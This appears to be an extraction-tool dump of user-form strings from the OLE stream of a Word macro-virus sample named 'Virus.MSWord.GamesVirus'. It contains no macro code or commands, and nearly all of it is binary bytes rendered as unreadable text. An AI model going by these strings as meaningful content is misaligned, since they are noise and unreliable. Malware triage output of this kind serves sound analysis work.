- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!8@BQ2Ri%)Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
%)a/9i$!a.1i%)a$!a.1a$!Y%)a%)a%)a%)a%)a&1a.1a%)a%)a%)a%)a.1a79Y79a8Ba&1Y%)a79I-)Y&1a%)a%)a.1i&1a%)a&1a%)a%)a-)a%)a%)a79q%)a.1a79Y79Y8BQ$!Y$!Y%)a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$! $!($! $!(
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
2Riq��i��a��<cy4cqNs�Ns�X��_{�3Zi=k�;Zi3Zi1JQ1JaNs�Vs�X��X��Vs�Fs�Vs�g{�DcyNs�Dc�Mk�Mk�Mk�Vs�<cq<cqCZi'9Q2RYCZi1Ja:RaEky2RQ1JI)JY(BQ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
! %) 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!8%)i
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!A2Ry
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!Y)Q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1Q1Ja
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!a.1i%)a%)a%)a%)a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!Y%)a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)a%)a%)a%)a%)a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!Y%)a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)a-)a%)a61Y&1a%)a%)a79q%)a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!a%)a%)Y%)a%)a%)a%)a%)a%)a%)a%)a%)a%)a%)a79a8Ba
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
<caa��MkyNsy<cq=ky4cq,cyW{�i��4cq3Zq'9Q:RaUki2RaFs�_{�>s�<cyEkqEkyMky`��<c�`��=k�^s�<cyVs�3Zq2Ri2Ra"Ra3Zi BY BI:Ra*Ra)JYCZi BY BQ(BQ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
0/9q%)A
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(%)a&1y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
-)Q&1i%)a%)a-)i%)a%)Y%)a%)a.1a&1a%)a%)a%)a%)a.1a%)a%)a%)a%)a-)a%)a%)a%)a%)a%)a.1i/9i%)a%)a$!Y-)a%)a%)a-)a&1a%)a%)a%)a%)a%)a%)a&1a79Q?9a%)a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ekyi��2RY;Zag{�Fs�P��Fs�Fs�=kyNs� Ba3Zq)JQ<c�;ZYFs�W{�Fs�<cqLcqO{�MkyFs�Fs�:RiDcyEk�MkyUk�Ekq<cy!JYDcq;ZiKZa)JY)Ja(BA'9I)JY(BQ1JY'9I
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
%)($! 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
.10%)(
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
A%)A

-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
()I0Ba&1�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
I0Ba2Ri
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)a%)a%)i%)a%)a%)a%)a%)a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!a%)a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!a%)a%)a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)a%)a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)a%)a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!Y%)a%)Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)a%)a%)a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)a%)a%)a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)a$!a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)Y%)a%)a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)Y%)a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)a$!a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!Y$!Y79Y61a%)a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!a$!Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
W{�r��DcqMkq=ky<cqW{�W{�O{�Ns�W{�)Ja,cq2RiNs�2RQ;Zi=ky=k�2RiDciMky]kq BIFs�*Ra*RaVs�=kyDcy<cy<cq BQDcq)JY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!0'9I(BQ(BQ)JI'9I
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
-)($! 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
%)($!(%) 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
0/9i2Ri
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
8.1i%)q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$! %)Q.1i%)a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)Y%)a%)a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!Y%)a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)a%)a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)a&1a%)a%)a%)a%)a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!Y%)a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)a%)a%)a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)a%)a&1i
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)a$!a%)a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)a%)a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)a%)a%)a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)a%)a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!Y$!a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)a%)a8Ba-)a%)a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
-)(790
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Fs�i��DciNsyP��4cq3ZyG{�>s�Ns�Ns�Dcq<cy4cqVs�*Ra'9Q*Ra BQ)JaNsyVs�_{�2RQ;Za2RaDcqDcq<cy=kyDcq<cq2Ra:RaCZI
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9A'9I!JY(BQ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1ADci
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
-)(%) 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 $! $! #
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
! -)(
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
61($! 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
A'9Q

-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 %)I

-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!8%)i
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!�&18
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
&1a$!a%)a%)a%)a%)a%)a$!Y%)a%)a%)a%)a$!Y$!Y%)a$!a%)a%)a%)a%)a$!a%)a%)a%)a%)Y%)a$!a%)a%)a%)a%)a%)Y%)a%)a$!a&1a&1a%)a%)a%)a&1i61a%)a%)a	
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
! $! 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$! $! $! %)(Vs�a��<cqEkyW{�3ZqMkq:Ra4c�)Ja'9I"Ri Ba=kqNs�<cy
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9I BY'9Q;Zig{�_{�`��Dcq;Za2RiCZq3Zi<cq3Zi;ZiLcq;Zq(BQ1Ja
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(!JY1JY)JQ;Zq(BA(BI
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)8)Ja
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
8BA61(
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)Y%)a&1a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!Y%)a%)a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)Y%)a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)Y.1Y-)a.1Y%)a%)a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)Y$!a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!Y%)a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)Y%)a%)a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)Y%)a%)a%)Y%)a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)Y%)Y%)a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)a$!Y$!a%)a%)a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!a%)a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)a%)a%)a.1i	
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ekya��z��Vs�Fs�3Zq*Ri=ky3Zq!Ja2Rq;Zy Ba<cy*RqNsy)JQ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1ADcqW{�_{�Vsy_{�;Za*RY;ZiDcq3Zi;Zi2RiDcqDcqUky Ba2Ra*Ra
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1I'9I BQ1JI(BI'9I)JY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
.1(%) 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$! $! 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!0%)A%)A%)A.1I&1Q Ba
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!I Bi
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)a%)Y%)a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)Y%)Y$!a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)Y61a-)I%)Y$!Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)Y%)Y-)I61Q%)a%)a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!a%)a%)Y%)a%)a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)a%)Y%)a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!Y-)a%)a%)a&1a%)a%)a%)a%)a&1a%)a%)a%)a%)a%)a&1a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 $! #
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
! $! 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$! EkyP��i��P��X��3Zq3ZqFs�<cy=k�2Ri=ky Ba Ba<cy3Zi*Ra
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)01Ja`��_{�Nsy:RYCZi:RaCZiDcq*Ra2Ra!JY;ZiDcqLcqVsq2Ra2Ra)JY&18BRY(BQ'98
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1A'9I1JI
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$! $!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
%)Y%)a$!Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!Y%)a%)Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!Y%)a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!Q61Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!Y%)a%)Y%)Q%)Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!Y%)a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!Y%)Y%)Y
